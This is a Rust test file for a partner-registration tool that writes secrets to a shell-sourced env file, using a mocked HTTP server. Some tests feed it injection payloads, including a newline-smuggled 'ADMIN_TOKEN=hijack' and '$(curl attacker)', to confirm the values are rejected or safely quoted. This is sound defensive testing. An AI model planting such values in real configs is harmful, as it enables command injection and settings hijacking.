//! Phase 4.3c — register POST + parse + env-file write flow tests.
//! Mock HTTP via mockito; no real network required.
use opec::secrets::{register, SecretsError};
use std::fs;
use tempfile::TempDir;

fn make_files(tmp: &std::path::Path) {
    fs::write(tmp.join("reality.pub"), "REALITY_PUB_VALUE\n").unwrap();
    fs::write(
        tmp.join("reality.uuid"),
        "11111111-2222-3333-4444-555555555555\n",
    )
    .unwrap();
    fs::write(tmp.join("awg.pub"), "AWG_PUB_VALUE\n").unwrap();
}

fn args_for(tmp: &std::path::Path, registry_url: String) -> register::Args {
    register::Args {
        registry_url,
        partner_id: "p".to_string(),
        domain: "d.net".to_string(),
        token: "t".to_string(),
        public_ip: "1.1.1.1".to_string(),
        reality_pub_file: tmp.join("reality.pub"),
        reality_uuid_file: tmp.join("reality.uuid"),
        awg_pub_file: tmp.join("awg.pub"),
        out_env: tmp.join("out.env"),
        region: None,
        branding_config: None,
        timeout_secs: 5,
        retries: 1,
    }
}

#[test]
fn register_success_writes_envfile() {
    let mut server = mockito::Server::new();
    let mock = server
        .mock("POST", "/api/partner/register")
        .with_status(200)
        .with_body(
            r#"{
            "node_id": "node-123",
            "backend_endpoint": "1.2.3.4:5349",
            "turn_secret": "ts-deadbeef",
            "reality_uuid": "11111111-2222-3333-4444-555555555555",
            "reality_public_key": "REALITY_PUB_VALUE",
            "reality_short_id": "0123456789abcdef",
            "reality_server_name": "www.cloudflare.com",
            "reality_encryption": "mlkem768x25519plus",
            "relay_jwt_secret": "rjs-cafebabe",
            "turns_subdomain": "api-test"
        }"#,
        )
        .create();

    let tmp = TempDir::new().unwrap();
    make_files(tmp.path());
    register::run(args_for(tmp.path(), server.url())).expect("register succeeds");

    let env = fs::read_to_string(tmp.path().join("out.env")).unwrap();
    // Single-quoted values — bash source treats them literally (no $-expansion).
    assert!(env.contains("NODE_ID='node-123'"));
    assert!(env.contains("BACKEND_ENDPOINT='1.2.3.4:5349'"));
    assert!(env.contains("TURN_SECRET='ts-deadbeef'"));
    assert!(env.contains("REALITY_ENCRYPTION='mlkem768x25519plus'"));
    assert!(env.contains("RELAY_JWT_SECRET='rjs-cafebabe'"));
    mock.assert();

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = fs::metadata(tmp.path().join("out.env"))
            .unwrap()
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(mode, 0o600, "out-env must be 0600");
    }
}

#[test]
fn register_http_500_errors() {
    let mut server = mockito::Server::new();
    let _mock = server
        .mock("POST", "/api/partner/register")
        .with_status(500)
        .with_body("backend down")
        .create();
    let tmp = TempDir::new().unwrap();
    make_files(tmp.path());
    let err = register::run(args_for(tmp.path(), server.url())).expect_err("must fail");
    assert!(
        matches!(err, SecretsError::Http { status: 500, .. }),
        "expected Http{{500}}, got {err:?}"
    );
}

#[test]
fn register_stale_registry_dies() {
    let mut server = mockito::Server::new();
    let _mock = server
        .mock("POST", "/api/partner/register")
        .with_status(200)
        .with_body(
            r#"{
            "node_id": "n", "backend_endpoint": "x", "turn_secret": "t",
            "reality_uuid": "u", "reality_public_key": "STALE_KEY",
            "reality_short_id": "s", "reality_server_name": "n",
            "reality_encryption": "",
            "relay_jwt_secret": "j", "turns_subdomain": "d"
        }"#,
        )
        .create();
    let tmp = TempDir::new().unwrap();
    make_files(tmp.path());
    let err = register::run(args_for(tmp.path(), server.url())).expect_err("stale must die");
    assert!(
        matches!(err, SecretsError::StaleRegistry),
        "expected StaleRegistry, got {err:?}"
    );
}

#[test]
fn register_missing_required_field_errors() {
    let mut server = mockito::Server::new();
    let _mock = server
        .mock("POST", "/api/partner/register")
        .with_status(200)
        .with_body(r#"{"node_id": "n"}"#) // missing everything else
        .create();
    let tmp = TempDir::new().unwrap();
    make_files(tmp.path());
    let err = register::run(args_for(tmp.path(), server.url())).expect_err("must error");
    assert!(
        matches!(
            err,
            SecretsError::MissingResponseField { .. } | SecretsError::Http { .. }
        ),
        "expected MissingResponseField or Http parse error, got {err:?}"
    );
}

#[test]
fn register_rejects_newline_in_response_value() {
    // Backend returns a value with newline → must refuse to write env-file
    // (shell-source injection vector).
    let mut server = mockito::Server::new();
    let _m = server
        .mock("POST", "/api/partner/register")
        .with_status(200)
        .with_body(
            r#"{
            "node_id": "n",
            "backend_endpoint": "1.2.3.4:5349",
            "turn_secret": "ts\nADMIN_TOKEN=hijack",
            "reality_uuid": "11111111-2222-3333-4444-555555555555",
            "reality_public_key": "RK",
            "reality_short_id": "0123",
            "reality_server_name": "x",
            "reality_encryption": "mlkem768x25519plus",
            "relay_jwt_secret": "rjs",
            "turns_subdomain": "d"
        }"#,
        )
        .create();
    let tmp = TempDir::new().unwrap();
    make_files(tmp.path());
    let err = register::run(args_for(tmp.path(), server.url()))
        .expect_err("newline in value must be rejected");
    assert!(
        matches!(err, SecretsError::InvalidResponseValue { ref name, .. } if name == "TURN_SECRET"),
        "expected InvalidResponseValue for TURN_SECRET, got: {err:?}"
    );
    // out.env must NOT have been written.
    assert!(
        !tmp.path().join("out.env").exists(),
        "env-file must not be created when validation fails"
    );
}

#[test]
fn register_response_parse_error_does_not_leak_body() {
    // Backend returns non-JSON containing a secret-shaped token. The error
    // message must NOT include the body content — only length/category.
    let mut server = mockito::Server::new();
    let leaky_body = "TURN_SECRET=super-secret-leak-marker-xyz";
    let _m = server
        .mock("POST", "/api/partner/register")
        .with_status(200)
        .with_body(leaky_body)
        .create();
    let tmp = TempDir::new().unwrap();
    make_files(tmp.path());
    let err = register::run(args_for(tmp.path(), server.url()))
        .expect_err("non-JSON response must error");
    let msg = format!("{err}");
    assert!(
        !msg.contains("super-secret-leak-marker-xyz"),
        "response body must not appear in error message: {msg}"
    );
    assert!(
        matches!(err, SecretsError::ResponseParse { .. }),
        "expected ResponseParse, got: {err:?}"
    );
}

#[test]
fn register_transport_error_retries_then_fails() {
    // Point at a port nothing is listening on — every attempt is a Transport
    // error (connection refused). Verify the retry loop exhausts and returns
    // Transport (not Http).
    let tmp = TempDir::new().unwrap();
    make_files(tmp.path());
    let mut args = args_for(tmp.path(), "http://127.0.0.1:1".to_string()); // port 1 = reserved/closed
    args.retries = 1;
    args.timeout_secs = 2;
    let err = register::run(args).expect_err("connect-refused must error");
    assert!(
        matches!(err, SecretsError::Transport { .. }),
        "expected Transport after exhausted retries, got: {err:?}"
    );
}

#[test]
fn register_envfile_resists_dollar_command_substitution() {
    // Backend returns value containing $() — must NOT be interpreted as
    // command substitution when env-file is sourced. Single-quoting in
    // write_env_file prevents this.
    let mut server = mockito::Server::new();
    let _m = server
        .mock("POST", "/api/partner/register")
        .with_status(200)
        .with_body(
            r#"{
            "node_id": "n",
            "backend_endpoint": "1.2.3.4:5349",
            "turn_secret": "$(curl attacker)",
            "reality_uuid": "11111111-2222-3333-4444-555555555555",
            "reality_public_key": "RK",
            "reality_short_id": "0123",
            "reality_server_name": "x",
            "reality_encryption": "mlkem768x25519plus",
            "relay_jwt_secret": "rjs",
            "turns_subdomain": "d"
        }"#,
        )
        .create();
    let tmp = TempDir::new().unwrap();
    make_files(tmp.path());
    register::run(args_for(tmp.path(), server.url())).expect("register succeeds");

    let env = fs::read_to_string(tmp.path().join("out.env")).unwrap();
    // Value preserved verbatim inside single quotes — bash 'source' treats
    // single-quoted strings literally; $(...) is NOT expanded.
    assert!(
        env.contains("TURN_SECRET='$(curl attacker)'"),
        "env-file must single-quote dangerous values; got:\n{env}"
    );
    // Double-quoted form would be the bug we are guarding against.
    assert!(
        !env.contains("TURN_SECRET=\""),
        "env-file MUST NOT use double quotes — they enable $-expansion at source time"
    );
}

#[test]
fn register_envfile_escapes_embedded_single_quote() {
    let mut server = mockito::Server::new();
    let _m = server
        .mock("POST", "/api/partner/register")
        .with_status(200)
        .with_body(
            r#"{
            "node_id": "abc'def",
            "backend_endpoint": "1.2.3.4:5349",
            "turn_secret": "ts",
            "reality_uuid": "11111111-2222-3333-4444-555555555555",
            "reality_public_key": "RK",
            "reality_short_id": "0123",
            "reality_server_name": "x",
            "reality_encryption": "mlkem768x25519plus",
            "relay_jwt_secret": "rjs",
            "turns_subdomain": "d"
        }"#,
        )
        .create();
    let tmp = TempDir::new().unwrap();
    make_files(tmp.path());
    register::run(args_for(tmp.path(), server.url())).expect("register succeeds");

    let env = fs::read_to_string(tmp.path().join("out.env")).unwrap();
    // Canonical bash single-quote escape: 'abc'\''def'
    assert!(
        env.contains("NODE_ID='abc'\\''def'"),
        "expected canonical single-quote escape, got: {env}"
    );
}

// --- Bug F regression tests ---
// Per cross-repo contract investigation: oxpulse-chat /api/partner/register
// has never emitted relay_jwt_secret. The hard require() added in Phase 4.3c
// (May 17) causes all fresh installs to fail at step [4/10]. These tests
// document the correct behaviour: absent/null field -> RELAY_JWT_SECRET='',
// present field -> RELAY_JWT_SECRET='<value>'.

fn full_response_body_without_relay_jwt_secret() -> &'static str {
    r#"{
        "node_id": "node-123",
        "backend_endpoint": "1.2.3.4:5349",
        "turn_secret": "ts-deadbeef",
        "reality_uuid": "11111111-2222-3333-4444-555555555555",
        "reality_public_key": "REALITY_PUB_VALUE",
        "reality_short_id": "0123456789abcdef",
        "reality_server_name": "www.cloudflare.com",
        "reality_encryption": "mlkem768x25519plus",
        "turns_subdomain": "api-test"
    }"#
}

fn full_response_body_with_relay_jwt_null() -> &'static str {
    r#"{
        "node_id": "node-123",
        "backend_endpoint": "1.2.3.4:5349",
        "turn_secret": "ts-deadbeef",
        "reality_uuid": "11111111-2222-3333-4444-555555555555",
        "reality_public_key": "REALITY_PUB_VALUE",
        "reality_short_id": "0123456789abcdef",
        "reality_server_name": "www.cloudflare.com",
        "reality_encryption": "mlkem768x25519plus",
        "relay_jwt_secret": null,
        "turns_subdomain": "api-test"
    }"#
}

/// Bug F regression: server omits relay_jwt_secret entirely ->
/// opec must accept it and emit RELAY_JWT_SECRET='' in the env-file.
#[test]
fn register_accepts_missing_relay_jwt_secret() {
    let mut server = mockito::Server::new();
    let _mock = server
        .mock("POST", "/api/partner/register")
        .with_status(200)
        .with_body(full_response_body_without_relay_jwt_secret())
        .create();

    let tmp = TempDir::new().unwrap();
    make_files(tmp.path());
    register::run(args_for(tmp.path(), server.url()))
        .expect("missing relay_jwt_secret must not error");

    let env = fs::read_to_string(tmp.path().join("out.env")).unwrap();
    assert!(
        env.contains("RELAY_JWT_SECRET=''"),
        "missing relay_jwt_secret must emit empty line; got:\n{env}"
    );
}

/// Bug F regression: server sends relay_jwt_secret: null ->
/// opec must accept it and emit RELAY_JWT_SECRET='' in the env-file.
#[test]
fn register_accepts_null_relay_jwt_secret() {
    let mut server = mockito::Server::new();
    let _mock = server
        .mock("POST", "/api/partner/register")
        .with_status(200)
        .with_body(full_response_body_with_relay_jwt_null())
        .create();

    let tmp = TempDir::new().unwrap();
    make_files(tmp.path());
    register::run(args_for(tmp.path(), server.url()))
        .expect("null relay_jwt_secret must not error");

    let env = fs::read_to_string(tmp.path().join("out.env")).unwrap();
    assert!(
        env.contains("RELAY_JWT_SECRET=''"),
        "null relay_jwt_secret must emit empty line; got:\n{env}"
    );
}

/// Backward-compat: server sends a non-empty relay_jwt_secret ->
/// env-file must carry the value (existing 5 nodes, legacy HS256 path).
#[test]
fn register_emits_relay_jwt_secret_when_present() {
    let mut server = mockito::Server::new();
    let _mock = server
        .mock("POST", "/api/partner/register")
        .with_status(200)
        .with_body(
            r#"{
            "node_id": "node-456",
            "backend_endpoint": "5.6.7.8:5349",
            "turn_secret": "ts-aabbcc",
            "reality_uuid": "11111111-2222-3333-4444-555555555555",
            "reality_public_key": "REALITY_PUB_VALUE",
            "reality_short_id": "fedcba9876543210",
            "reality_server_name": "www.example.com",
            "reality_encryption": "mlkem768x25519plus",
            "relay_jwt_secret": "rjs-legacy-value",
            "turns_subdomain": "api-prod"
        }"#,
        )
        .create();

    let tmp = TempDir::new().unwrap();
    make_files(tmp.path());
    register::run(args_for(tmp.path(), server.url()))
        .expect("present relay_jwt_secret must succeed");

    let env = fs::read_to_string(tmp.path().join("out.env")).unwrap();
    assert!(
        env.contains("RELAY_JWT_SECRET='rjs-legacy-value'"),
        "present relay_jwt_secret must be emitted verbatim; got:\n{env}"
    );
}

/// MINOR fix: empty-string relay_jwt_secret from server must be treated
/// identically to absent/null — normalized to None in into_validated(),
/// and emitted as RELAY_JWT_SECRET='' in the env-file.
#[test]
fn register_empty_string_relay_jwt_normalizes_to_empty_envfile() {
    let mut server = mockito::Server::new();
    let _mock = server
        .mock("POST", "/api/partner/register")
        .with_status(200)
        .with_body(
            r#"{
            "node_id": "node-789",
            "backend_endpoint": "9.10.11.12:5349",
            "turn_secret": "ts-empty-relay",
            "reality_uuid": "11111111-2222-3333-4444-555555555555",
            "reality_public_key": "REALITY_PUB_VALUE",
            "reality_short_id": "0123456789abcdef",
            "reality_server_name": "www.cloudflare.com",
            "reality_encryption": "mlkem768x25519plus",
            "relay_jwt_secret": "",
            "turns_subdomain": "api-test"
        }"#,
        )
        .create();

    let tmp = TempDir::new().unwrap();
    make_files(tmp.path());
    register::run(args_for(tmp.path(), server.url()))
        .expect("empty-string relay_jwt_secret must not error");

    let env = fs::read_to_string(tmp.path().join("out.env")).unwrap();
    // Some("") must be normalized to None by into_validated(), so env-file
    // emits the same empty-value line as absent/null.
    assert!(
        env.contains("RELAY_JWT_SECRET=''"),
        "empty-string relay_jwt_secret must emit empty line; got:\n{env}"
    );
}
